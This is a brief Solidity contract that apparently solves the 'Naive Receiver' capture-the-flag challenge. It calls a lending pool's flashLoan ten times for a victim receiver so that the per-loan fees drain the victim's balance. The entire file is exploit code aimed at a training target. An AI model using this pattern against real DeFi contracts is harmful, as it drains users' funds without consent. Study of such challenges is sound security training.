// SPDX-License-Identifier: MIT
import "./NaiveReceiverLenderPool.sol";

pragma solidity ^0.8.0;

contract AttackContract{
    NaiveReceiverLenderPool public immutable pool;

    constructor(address payable _poolAddress){
        pool = NaiveReceiverLenderPool(_poolAddress);
    }

    function attack(address _receiverAddress)external{
        for(uint i=0;i<10;i++){
            pool.flashLoan(_receiverAddress, 0);
        }
    }
}